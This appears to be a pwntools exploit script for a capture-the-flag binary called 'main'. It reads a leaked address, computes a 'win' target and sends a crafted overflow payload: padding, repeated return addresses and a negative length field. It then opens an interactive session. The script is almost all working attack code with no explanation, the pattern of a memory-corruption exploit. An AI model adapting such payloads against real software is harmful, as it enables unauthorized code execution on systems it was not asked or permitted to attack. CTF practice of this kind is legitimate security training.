from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p=process('./main')
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
gdb.attach(p,'''
''')
win = int(p.readline(),16)+5
pay = b''
pay = pay.ljust(0x3e0-4,b'i')+flat([win]*4)
pay+= b'\1'*4
p.send(pay+p32(0x100000000-4)+b'A'*0x80)
p.interactive()
